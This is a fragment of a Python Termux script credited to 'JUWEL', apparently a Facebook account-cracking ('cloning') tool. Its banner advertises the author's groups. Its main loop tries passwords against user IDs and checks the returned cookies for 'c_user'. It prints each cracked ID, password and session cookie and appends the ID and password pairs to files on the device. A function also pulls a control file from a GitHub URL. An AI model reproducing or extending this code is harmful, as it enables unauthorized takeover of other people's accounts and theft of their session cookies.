#Gift By ASRAFUL ISLAM JUWEL

#Group: JUWEL TERMUX HALPING ZONE

# 2nd Group : JUWEL SCRIPT AND ID GIFT ZONE
...
';                     `;/'      '\                   ,·'          '\            '/ '\              /           `·,                  ,·'  '      i´        ¯          'i/ ' 
 ...
 \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m. JUWEL   \033[1;93m║

 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m JUWEL\033[1;93m║

 \033[1;93m║     \033[1;35m[✓] GITHUB       :  \33[1;35mMENTAL-NAHID         \033[1;93m ║
 ...
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m JUWEL TERMUX COMMEND ZONE....           \033[1;93m ║

 ╚═════════════════[\033[1;32m JUWEL \033[1;32m]══════════════════╝""")
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\r \033[38;5;196m[\033[38;5;45mJUWEL-OK🌺\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🤖\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/JUWEL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                ...
                #print('\r\r\33[1;30m[JUWEL-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/JUWEL-CP.txt', 'a').write( uid+' | '+ps+' \n')
        ...
        sys.stdout.write(f'\r\r%s{x} [{xr}JUWEL{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
...
def superuser():
    ...
    DARK=requests.get("https://github.com/JUWEL999/contolpanel/blob/main/nahid.txt").text
